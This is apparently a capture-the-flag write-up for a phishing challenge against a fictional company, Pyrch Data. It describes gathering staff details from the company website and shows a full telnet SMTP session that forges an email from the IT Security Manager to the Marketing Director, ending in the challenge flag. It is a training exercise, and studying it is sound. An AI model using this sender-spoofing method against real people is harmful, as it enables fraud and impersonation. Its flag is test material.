# Red Phish Blue Phish
  
You are to conduct a phishing excercise against our client, Pyrch Data.  
We've identified the Marketing Director, Sarah Williams (swilliams@pyrchdata.com), as a user susceptible to phishing.  
Are you able to successfully phish her? Remember your OSINT ;)  
  
**NOTE: The port that becomes accessible upon challenge deployment is an SMTP server. Please use this for sending any phishing emails.**

-----

Given our target, `swilliams@pyrchdata.com`, we can navigate to the domain [pyrchdata.com](pyrchdata.com) to gather OSINT.

We see a [Meet the Team](https://pyrchdata.com/team) which confirms our target is the Head of Marketing. It also lists Joe Daveren as the IT Security Manager which is a plausible target for spoofing.

![[huntress/2024/images/Pasted image 20241002211411.png]]

![[huntress/2024/images/Pasted image 20241002211454.png]]

Given the format of our target, Joe Daveren's email is likely `jdaveren@pychrdata.com`.

We can connect to the SMTP server with `telnet` to send our phishing email. (Note, `telnet` is required due to the automatic inclusion of `<CR><LF>` whereas `nc` uses the line ending from the respective OS)

```
HELO pyrchdata.com
250 red-phish-blue-phish-4a15342fc478349a-845974f9f6-pbbc9
MAIL FROM:<jdaveren@pyrchdata.com>
250 OK
RCPT TO:<swilliams@pyrchdata.com>
250 OK
DATA
354 End data with <CR><LF>.<CR><LF> http://canarytokens.com/feedback/tags/articles/7gl5bofptyy0atmkqyab62l3c/post.jsp
.
250 OK. flag{54c6ec05ca19565754351b7fcf9c03b2}
```